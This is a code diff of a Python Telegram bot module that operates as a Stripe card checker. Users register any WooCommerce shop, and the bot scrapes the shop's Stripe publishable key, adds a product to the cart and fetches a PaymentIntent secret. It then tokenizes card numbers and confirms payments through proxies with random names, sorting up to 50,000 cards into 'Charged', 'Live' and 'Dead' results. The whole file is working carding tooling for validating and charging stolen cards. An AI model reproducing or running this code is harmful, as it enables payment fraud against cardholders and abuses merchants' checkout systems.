@@ -5,17 +5,19 @@ import random
 import time
 import os
 import uuid
+import json
 import aiofiles
 from telethon import events, Button
 
 # ─── CONFIG ────────────────────────────────────────────────────────────────────
-STRIPE_SITE = "https://shop.nemaneide.com"
-STRIPE_API  = "https://api.stripe.com/v1"
-MAX_CARDS   = 50000
+STRIPE_API        = "https://api.stripe.com/v1"
+MAX_CARDS         = 50000
+_STRIPE_SITES_FILE = "stripe_sites.json"
 
-_cached_pk  = None  # auto-scraped from site, cached after first fetch
+_stripe_sites: dict = {}   # {user_id: site_url}
+_pk_cache: dict     = {}   # {site_url: pk}
 
-# ─── LIVE DECLINE CODES (card exists, bank blocked) ────────────────────────────
+# ─── LIVE DECLINE CODES ────────────────────────────────────────────────────────
 _LIVE_CODES = {
     'insufficient_funds', 'do_not_honor', 'transaction_not_allowed',
     'card_velocity_exceeded', 'withdrawal_count_limit_exceeded',
@@ -38,6 +40,32 @@ _BROWSER_HEADERS = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.9',
 }
+
+# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
+def _load_stripe_sites():
+    global _stripe_sites
+    try:
+        with open(_STRIPE_SITES_FILE) as f:
+            data = json.load(f)
+        _stripe_sites = {int(k): v for k, v in data.items()}
+    except Exception:
+        _stripe_sites = {}
+
+def _save_stripe_sites():
+    try:
+        with open(_STRIPE_SITES_FILE, 'w') as f:
+            json.dump({str(k): v for k, v in _stripe_sites.items()}, f)
+    except Exception:
+        pass
+
+def _get_user_site(user_id):
+    return _stripe_sites.get(user_id)
+
+def _set_user_site(user_id, url):
+    _stripe_sites[user_id] = url
+    _save_stripe_sites()
+    # Clear cached PK for this site so it re-scrapes
+    _pk_cache.pop(url, None)
 
 # ─── HELPERS ───────────────────────────────────────────────────────────────────
 def _parse_card(card):
@@ -84,23 +112,22 @@ def _random_name():
     last  = random.choice(['Smith', 'Brown', 'Jones', 'Davis', 'Wilson'])
     return first, last
 
+def _normalize_url(url):
+    url = url.strip().rstrip('/')
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    return url
+
 # ─── PK SCRAPER ────────────────────────────────────────────────────────────────
-async def _scrape_pk(session, proxy):
-    """Scrape Stripe publishable key from site checkout/homepage."""
-    global _cached_pk
-    if _cached_pk:
-        return _cached_pk
+async def _scrape_pk(session, site, proxy):
+    if site in _pk_cache:
+        return _pk_cache[site]
 
     _pk_patterns = [
-        r'["\']?(pk_live_[A-Za-z0-9]{20,})["\']?',
-        r'["\']?(pk_test_[A-Za-z0-9]{20,})["\']?',
+        r'(pk_live_[A-Za-z0-9]{20,})',
+        r'(pk_test_[A-Za-z0-9]{20,})',
     ]
-
-    urls_to_try = [
-        f'{STRIPE_SITE}/checkout/',
-        f'{STRIPE_SITE}/',
-        f'{STRIPE_SITE}/shop/',
-    ]
+    urls_to_try = [f'{site}/checkout/', f'{site}/', f'{site}/shop/']
 
     for url in urls_to_try:
         try:
@@ -112,15 +139,14 @@ async def _scrape_pk(session, proxy):
             for pat in _pk_patterns:
                 m = re.search(pat, text)
                 if m:
-                    _cached_pk = m.group(1)
-                    return _cached_pk
+                    _pk_cache[site] = m.group(1)
+                    return _pk_cache[site]
         except Exception:
             continue
     return None
 
 # ─── CORE STRIPE FUNCTIONS ──────────────────────────────────────────────────────
-async def _create_payment_method(session, cc, mes, ano, cvv, pk, proxy):
-    """Tokenize card with Stripe publishable key → PaymentMethod ID"""
+async def _create_payment_method(session, cc, mes, ano, cvv, pk, site, proxy):
     first, last = _random_name()
     guid      = str(uuid.uuid4())
     muid      = str(uuid.uuid4())
@@ -148,7 +174,7 @@ async def _create_payment_method(session, cc, mes, ano, cvv, pk, proxy):
         f'&guid={guid}'
         f'&muid={muid}'
         f'&sid={sid}'
-        f'&referrer={STRIPE_SITE}%2Fcheckout%2F'
+        f'&referrer={site}%2Fcheckout%2F'
     )
     try:
         async with session.post(
@@ -159,17 +185,16 @@ async def _create_payment_method(session, cc, mes, ano, cvv, pk, proxy):
             result = await resp.json(content_type=None)
             if resp.status == 200 and result.get('id'):
                 return result['id'], None
-            err = result.get('error', {})
+            err  = result.get('error', {})
             code = err.get('decline_code') or err.get('code') or err.get('message', 'tokenization_failed')
             return None, code
     except Exception as e:
         return None, f'pm_error: {e}'
 
-async def _get_product_id(session, proxy):
-    """Find cheapest product ID from WooCommerce site"""
+async def _get_product_id(session, site, proxy):
     try:
         async with session.get(
-            f'{STRIPE_SITE}/shop/',
+            f'{site}/shop/',
             headers=_BROWSER_HEADERS, proxy=proxy,
             timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
         ) as resp:
@@ -182,20 +207,19 @@ async def _get_product_id(session, proxy):
     except Exception:
         return None
 
-async def _setup_cart_and_get_pi(session, proxy):
-    """Add product to cart, go to checkout, get PaymentIntent client secret"""
+async def _setup_cart_and_get_pi(session, site, proxy):
     try:
-        product_id = await _get_product_id(session, proxy)
+        product_id = await _get_product_id(session, site, proxy)
         if product_id:
             async with session.get(
-                f'{STRIPE_SITE}/?add-to-cart={product_id}&quantity=1',
+                f'{site}/?add-to-cart={product_id}&quantity=1',
                 headers=_BROWSER_HEADERS, proxy=proxy,
                 timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
             ) as resp:
                 pass
 
         async with session.get(
-            f'{STRIPE_SITE}/checkout/',
+            f'{site}/checkout/',
             headers=_BROWSER_HEADERS, proxy=proxy,
             timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
         ) as resp:
@@ -219,11 +243,11 @@ async def _setup_cart_and_get_pi(session, proxy):
             **_BROWSER_HEADERS,
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-Requested-With': 'XMLHttpRequest',
-            'Referer': f'{STRIPE_SITE}/checkout/',
+            'Referer': f'{site}/checkout/',
         }
         for action in ['wc_stripe_create_payment_intent', 'wc_stripe_checkout']:
             async with session.post(
-                f'{STRIPE_SITE}/wp-admin/admin-ajax.php',
+                f'{site}/wp-admin/admin-ajax.php',
                 headers=ajax_headers,
                 data=f'action={action}&nonce={nonce}',
                 proxy=proxy,
@@ -231,8 +255,8 @@ async def _setup_cart_and_get_pi(session, proxy):
             ) as resp:
                 try:
                     pi_data = await resp.json(content_type=None)
-                    secret = (pi_data.get('data', {}).get('client_secret') or
-                              pi_data.get('client_secret'))
+                    secret  = (pi_data.get('data', {}).get('client_secret') or
+                               pi_data.get('client_secret'))
                     if secret and '_secret_' in secret:
                         return secret
                 except Exception:
@@ -241,22 +265,21 @@ async def _setup_cart_and_get_pi(session, proxy):
     except Exception:
         return None
 
-async def _confirm_pi(session, client_secret, pm_id, pk, proxy):
-    """Confirm PaymentIntent → returns (status, message)"""
+async def _confirm_pi(session, client_secret, pm_id, pk, site, proxy):
     pi_id = client_secret.split('_secret_')[0]
     first, last = _random_name()
     headers = {
         'Authorization': f'Bearer {pk}',
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Origin': STRIPE_SITE,
-        'Referer': f'{STRIPE_SITE}/checkout/',
+        'Origin': site,
+        'Referer': f'{site}/checkout/',
         'Stripe-Version': '2023-10-16',
     }
     data = (
         f'payment_method={pm_id}'
         f'&client_secret={client_secret}'
-        f'&return_url={STRIPE_SITE}/checkout/order-received/'
+        f'&return_url={site}/checkout/order-received/'
         f'&payment_method_data[billing_details][name]={first}+{last}'
         f'&payment_method_data[billing_details][address][country]=US'
     )
@@ -274,7 +297,6 @@ async def _confirm_pi(session, client_secret, pm_id, pk, proxy):
 
         if status in ('succeeded', 'requires_capture', 'processing'):
             return 'Charged', 'Payment Authorized ✅'
-
         if status == 'requires_action':
             nxt = result.get('next_action', {}).get('type', '')
             if '3ds' in nxt.lower() or 'redirect' in nxt.lower():
@@ -290,12 +312,10 @@ async def _confirm_pi(session, client_secret, pm_id, pk, proxy):
         if decline_code in _DEAD_CODES:
             return 'Dead', decline_code or message
         return 'Dead', message
-
     except Exception as e:
         return 'Error', str(e)
 
-async def stripe_auth(card, proxy_str=None):
-    """Check a single card via Stripe auth. Returns dict with status/message/card."""
+async def stripe_auth(card, site, proxy_str=None):
     parsed = _parse_card(card)
     if not parsed:
         return {'status': 'Dead', 'message': 'Invalid format', 'card': card, 'gateway': 'Stripe Auth'}
@@ -305,25 +325,19 @@ async def stripe_auth(card, proxy_str=None):
     connector = aiohttp.TCPConnector(ssl=False, force_close=True)
     try:
         async with aiohttp.ClientSession(connector=connector) as session:
-            # Step 0: Get PK from site
-            pk = await _scrape_pk(session, proxy)
+            pk = await _scrape_pk(session, site, proxy)
             if not pk:
-                return {'status': 'Error', 'message': 'Could not scrape Stripe PK from site', 'card': card, 'gateway': 'Stripe Auth'}
+                return {'status': 'Error', 'message': 'No Stripe PK found on site', 'card': card, 'gateway': 'Stripe Auth'}
 
-            # Step 1: Tokenize
-            pm_id, pm_err = await _create_payment_method(session, cc, mes, ano, cvv, pk, proxy)
+            pm_id, pm_err = await _create_payment_method(session, cc, mes, ano, cvv, pk, site, proxy)
             if not pm_id:
-                if any(c in str(pm_err) for c in _DEAD_CODES):
-                    return {'status': 'Dead', 'message': pm_err, 'card': card, 'gateway': 'Stripe Auth'}
                 return {'status': 'Dead', 'message': pm_err or 'Tokenization failed', 'card': card, 'gateway': 'Stripe Auth'}
 
-            # Step 2: Get PaymentIntent
-            client_secret = await _setup_cart_and_get_pi(session, proxy)
+            client_secret = await _setup_cart_and_get_pi(session, site, proxy)
             if not client_secret:
                 return {'status': 'Error', 'message': 'Could not get Payment Intent', 'card': card, 'gateway': 'Stripe Auth'}
 
-            # Step 3: Confirm
-            status, message = await _confirm_pi(session, client_secret, pm_id, pk, proxy)
+            status, message = await _confirm_pi(session, client_secret, pm_id, pk, site, proxy)
             return {'status': status, 'message': message, 'card': card, 'gateway': 'Stripe Auth'}
     finally:
         await connector.close()
@@ -331,32 +345,83 @@ async def stripe_auth(card, proxy_str=None):
 # ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
 def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
 
+    _load_stripe_sites()
+
+    @bot.on(events.NewMessage(pattern=r'^/sadd(\s|$)'))
+    async def sadd_handler(event):
+        user_id = event.sender_id
+        if not is_premium_fn(user_id):
+            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
+            return
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) < 2:
+            await event.reply(
+                "❌ <b>Usage:</b> <code>/sadd https://yoursite.com</code>\n\n"
+                "Site must be WooCommerce + Stripe.",
+                parse_mode='html'
+            )
+            return
+
+        url = _normalize_url(parts[1].strip())
+        wait = await event.reply(f"⏳ Checking site for Stripe PK...", parse_mode='html')
+
+        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
+        try:
+            proxies = load_proxies_fn(user_id)
+            proxy   = random.choice(proxies) if proxies else None
+            async with aiohttp.ClientSession(connector=connector) as session:
+                pk = await _scrape_pk(session, url, proxy)
+        finally:
+            await connector.close()
+
+        if pk:
+            _set_user_site(user_id, url)
+            masked = pk[:12] + '...' + pk[-4:]
+            await wait.edit(
+                f"✅ <b>Stripe Site Added!</b>\n\n"
+                f"🌐 <b>Site</b>  ▸  <code>{url}</code>\n"
+                f"🔑 <b>PK</b>    ▸  <code>{masked}</code>\n\n"
+                f"Now use <code>/st</code> or <code>/stxt</code> to check cards.",
+                parse_mode='html'
+            )
+        else:
+            await wait.edit(
+                f"❌ <b>No Stripe PK found on this site.</b>\n\n"
+                f"Make sure it's a WooCommerce + Stripe site.",
+                parse_mode='html'
+            )
+
     @bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
     async def st_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
             await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
             return
-        text = event.raw_text.split(maxsplit=1)
-        if len(text) < 2:
+        site = _get_user_site(user_id)
+        if not site:
+            await event.reply(
+                "❌ <b>No Stripe site set.</b>\n\n"
+                "Use <code>/sadd https://yoursite.com</code> first.",
+                parse_mode='html'
+            )
+            return
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) < 2:
             await event.reply("❌ <b>Usage:</b> <code>/st card|mm|yy|cvv</code>", parse_mode='html')
             return
-        card = text[1].strip()
+
+        card    = parts[1].strip()
         proxies = load_proxies_fn(user_id)
-        proxy = random.choice(proxies) if proxies else None
+        proxy   = random.choice(proxies) if proxies else None
+
         status_msg = await event.reply(
             f"⏳ <b>Stripe Auth</b> — Checking...\n<code>{card}</code>",
             parse_mode='html'
         )
-        result = await stripe_auth(card, proxy_str=proxy)
+        result  = await stripe_auth(card, site, proxy_str=proxy)
         status  = result['status']
         message = result['message']
-        if status == 'Charged':
-            emoji = '💎'
-        elif status == 'Live':
-            emoji = '🔥'
-        else:
-            emoji = '❌'
+        emoji   = '💎' if status == 'Charged' else ('🔥' if status == 'Live' else '❌')
         resp = (
             f"{emoji} <b>{status}</b>\n\n"
             f"💳 <b>Card</b>   ▸  <code>{card}</code>\n"
@@ -372,6 +437,14 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         if not is_premium_fn(user_id):
             await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
             return
+        site = _get_user_site(user_id)
+        if not site:
+            await event.reply(
+                "❌ <b>No Stripe site set.</b>\n\n"
+                "Use <code>/sadd https://yoursite.com</code> first.",
+                parse_mode='html'
+            )
+            return
         if not event.reply_to_msg_id:
             await event.reply("❌ Reply to a <b>.txt</b> file with cards.", parse_mode='html')
             return
@@ -380,7 +453,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
             return
 
-        wait_msg = await event.reply("⏳ Reading file...", parse_mode='html')
+        wait_msg  = await event.reply("⏳ Reading file...", parse_mode='html')
         file_path = await reply_msg.download_media()
         async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = await f.read()
@@ -398,11 +471,9 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         results = {'charged': [], 'live': [], 'dead': [], 'total': total, 'start': time.time()}
 
         await wait_msg.edit(
-            f"⚡ <b>Stripe Auth</b> — Starting\n"
-            f"💳 Cards: <b>{total}</b>",
+            f"⚡ <b>Stripe Auth</b> — Starting\n💳 Cards: <b>{total}</b>",
             parse_mode='html'
         )
-
         prog_msg = await bot.send_message(user_id, "🔄 Checking...", parse_mode='html')
         _stop = [False]
 
@@ -438,7 +509,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
                 return
             async with semaphore:
                 proxy  = random.choice(proxies) if proxies else None
-                result = await stripe_auth(card, proxy_str=proxy)
+                result = await stripe_auth(card, site, proxy_str=proxy)
                 st     = result['status']
                 if st == 'Charged':
                     results['charged'].append(result)
@@ -449,12 +520,11 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
                 if idx % 5 == 0 or idx == total:
                     await _update_prog(idx)
 
-        tasks = [_check_one(c, i+1) for i, c in enumerate(cards)]
-        await asyncio.gather(*tasks)
+        await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])
 
-        elapsed  = int(time.time() - results['start'])
-        h, rem   = divmod(elapsed, 3600)
-        m, s     = divmod(rem, 60)
+        elapsed = int(time.time() - results['start'])
+        h, rem  = divmod(elapsed, 3600)
+        m, s    = divmod(rem, 60)
         hits_txt = ''
         for r in results['charged'][:5]:
             hits_txt += f"💎 <code>{r['card']}</code>\n"
